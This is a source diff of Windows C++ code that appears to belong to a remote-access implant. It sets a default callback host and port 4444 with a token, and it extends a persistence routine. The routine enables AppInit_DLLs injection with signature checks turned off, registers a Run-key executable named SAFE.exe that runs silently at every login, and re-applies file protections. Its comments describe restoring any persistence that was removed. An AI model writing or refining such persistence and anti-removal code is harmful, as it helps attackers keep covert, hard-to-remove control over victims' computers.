@@ -275,9 +275,9 @@ inline Value err_resp(const std::string& msg) {
 // ─────────────────────────────────────────────────────────────────────────────
 // Config (read from environment variables at startup)
 // ─────────────────────────────────────────────────────────────────────────────
-static std::string g_host  = "192.168.1.20";
+static std::string g_host  = "127.0.0.1";
 static int         g_port  = 4444;
-static std::string g_token = "token";
+static std::string g_token = "changeme";
 
 static void load_config() {
     auto env = [](const char* name, const std::string& def) -> std::string {
@@ -2099,10 +2099,13 @@ void ensure(HMODULE hMod) {
     fs_reg_dword(HKEY_LOCAL_MACHINE, APINIT_KEY, "LoadAppInit_DLLs",          1);
     fs_reg_dword(HKEY_LOCAL_MACHINE, APINIT_KEY, "RequireSignedAppInit_DLLs", 0);
 
-    // ── 4. Run key: installer re-checks on every user login ──────────────────
+    // ── 4. Run key: register SAFE.exe as a startup watchdog ──────────────────
+    // SAFE.exe runs silently at every user login and self-heals any persistence
+    // that was removed while the machine was off. No args needed — it always
+    // runs in watchdog mode.
     if (GetFileAttributesA(dst_exe.c_str()) != INVALID_FILE_ATTRIBUTES)
         fs_reg_sz(HKEY_CURRENT_USER, RUN_KEY, RUN_VALUE,
-                  (dst_exe + " /check").c_str());
+                  dst_exe.c_str());  // no /check — SAFE.exe default IS the watchdog
 
     // ── 5. Re-apply file protections ─────────────────────────────────────────
     if (GetFileAttributesA(dst_dll.c_str()) != INVALID_FILE_ATTRIBUTES)
